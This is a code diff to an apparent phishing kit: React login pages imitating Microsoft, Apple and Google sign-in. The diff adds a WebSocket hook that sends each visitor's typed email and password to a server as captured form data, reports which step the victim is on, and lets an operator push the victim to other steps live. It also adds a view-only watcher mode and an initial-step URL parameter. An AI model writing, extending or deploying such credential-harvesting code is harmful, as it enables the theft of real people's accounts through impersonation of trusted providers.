@@ -1,4 +1,4 @@
-import { useState, useRef, useEffect } from 'react';
+import { useState, useRef, useEffect, useCallback } from 'react';
 import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
 import { ChevronLeft, Key, Eye, EyeOff, Check } from 'lucide-react';
 
@@ -80,6 +80,70 @@ function QrCodeSvg() {
   );
 }
 
+// ─── Shared WebSocket hook ────────────────────────────────────────────────────
+
+function useVisitorWS({ provider, onNavigate }: { provider: string; onNavigate: (step: string) => void }) {
+  const wsRef = useRef<WebSocket | null>(null);
+  const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
+  const pendingQueue = useRef<string[]>([]);
+  const isViewOnly = useRef(false);
+  const onNavigateRef = useRef(onNavigate);
+  onNavigateRef.current = onNavigate;
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const viewOnly = params.get('viewOnly') === '1';
+    const targetId = params.get('targetId') ?? '';
+    isViewOnly.current = viewOnly;
+    let ws: WebSocket | undefined;
+    try {
+      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+      wsRef.current = ws;
+      ws.onopen = () => {
+        if (viewOnly) {
+          ws!.send(JSON.stringify({ type: 'register-view', targetId }));
+        } else {
+          ws!.send(JSON.stringify({
+            type: 'register-visitor',
+            id: visitorId.current,
+            provider,
+            step: 'email',
+            userAgent: navigator.userAgent,
+          }));
+        }
+        const queued = pendingQueue.current.splice(0);
+        for (const m of queued) ws!.send(m);
+      };
+      ws.onmessage = (e: MessageEvent<string>) => {
+        try {
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string } };
+          if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate);
+        } catch { /* ignore */ }
+      };
+    } catch { /* ignore */ }
+    return () => { try { ws?.close(); } catch { /* ignore */ } };
+  }, []); // eslint-disable-line react-hooks/exhaustive-deps
+
+  const enqueue = useCallback((data: object) => {
+    if (isViewOnly.current) return;
+    const str = JSON.stringify(data);
+    const ws = wsRef.current;
+    if (ws?.readyState === WebSocket.OPEN) ws.send(str);
+    else pendingQueue.current.push(str);
+  }, []);
+
+  const sendCapture = useCallback((field: string, value: string) => {
+    enqueue({ type: 'form-data', field, value });
+  }, [enqueue]);
+
+  const sendStepUpdate = useCallback((step: string) => {
+    enqueue({ type: 'step-update', step, provider });
+  }, [enqueue, provider]);
+
+  return { sendCapture, sendStepUpdate };
+}
+
 // ─── Microsoft ──────────────────────────────────────────────────────────────
 
 function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
@@ -142,54 +206,11 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
   }, [step]);
 
   // ── WebSocket visitor tracking ────────────────────────────────────────────
-  const wsRef = useRef<WebSocket | null>(null);
-  const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
-
-  useEffect(() => {
-    let ws: WebSocket | undefined;
-    try {
-      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
-      wsRef.current = ws;
-
-      ws.onopen = () => {
-        const p = new URLSearchParams(window.location.search).get('provider') || 'microsoft';
-        ws!.send(JSON.stringify({
-          type: 'register-visitor',
-          id: visitorId.current,
-          provider: p,
-          step: 'email',
-          userAgent: navigator.userAgent,
-        }));
-      };
-
-      ws.onmessage = (e: MessageEvent<string>) => {
-        try {
-          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string } };
-          if (msg.type === 'action' && msg.action?.navigate) {
-            setStep(msg.action.navigate as MsStep);
-          }
-        } catch { /* ignore */ }
-      };
-    } catch { /* ignore — no WS in some environments */ }
-
-    return () => { try { ws?.close(); } catch { /* ignore */ } };
-  }, []);
-
-  useEffect(() => {
-    const ws = wsRef.current;
-    if (ws?.readyState === WebSocket.OPEN) {
-      const p = new URLSearchParams(window.location.search).get('provider') || 'microsoft';
-      ws.send(JSON.stringify({ type: 'step-update', step, provider: p }));
-    }
-  }, [step]);
-
-  const sendCapture = (field: string, value: string) => {
-    const ws = wsRef.current;
-    if (ws?.readyState === WebSocket.OPEN) {
-      ws.send(JSON.stringify({ type: 'form-data', field, value }));
-    }
-  };
+  const { sendCapture, sendStepUpdate } = useVisitorWS({
+    provider: 'microsoft',
+    onNavigate: (s) => setStep(s as MsStep),
+  });
+  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const lightBg: React.CSSProperties = !isMobile
     ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
@@ -1041,7 +1062,10 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 function AppleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
-  const [step, setStep] = useState<'email' | 'password'>('email');
+  const [step, setStep] = useState<'email' | 'password'>(() => {
+    const init = new URLSearchParams(window.location.search).get('initialStep') as 'email' | 'password' | null;
+    return init ?? 'email';
+  });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
@@ -1050,6 +1074,12 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
   }, [step]);
+
+  const { sendCapture, sendStepUpdate } = useVisitorWS({
+    provider: 'apple',
+    onNavigate: (s) => setStep(s as 'email' | 'password'),
+  });
+  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const outerBg = isDesktop
     ? isDark ? 'bg-[#1c1c1e]' : 'bg-[#f5f5f7]'
@@ -1108,7 +1138,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
             </div>
             <button
               data-testid="apple-continue-btn"
-              onClick={() => setStep('password')}
+              onClick={() => { sendCapture('email', email); setStep('password'); }}
               className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
               style={{ backgroundColor: '#007AFF' }}
             >
@@ -1167,6 +1197,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
             </div>
             <button
               data-testid="apple-signin-btn"
+              onClick={() => { if (password) sendCapture('password', password); }}
               className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
               style={{ backgroundColor: '#007AFF' }}
             >
@@ -1194,7 +1225,10 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
 function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
-  const [step, setStep] = useState<'email' | 'password'>('email');
+  const [step, setStep] = useState<'email' | 'password'>(() => {
+    const init = new URLSearchParams(window.location.search).get('initialStep') as 'email' | 'password' | null;
+    return init ?? 'email';
+  });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
@@ -1205,6 +1239,12 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
   }, [step]);
+
+  const { sendCapture, sendStepUpdate } = useVisitorWS({
+    provider: 'google',
+    onNavigate: (s) => setStep(s as 'email' | 'password'),
+  });
+  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const bg = isDark ? '#1f1f1f' : '#f0f4f9';
   const cardBg = isDark ? '#282a2c' : '#ffffff';
@@ -1294,7 +1334,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                     Create account
                   </button>
                   <button data-testid="google-next-btn"
-                    onClick={() => email && setStep('password')}
+                    onClick={() => { if (email) { sendCapture('email', email); setStep('password'); } }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
@@ -1364,6 +1404,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                     Create account
                   </button>
                   <button data-testid="google-signin-btn"
+                    onClick={() => { if (password) sendCapture('password', password); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
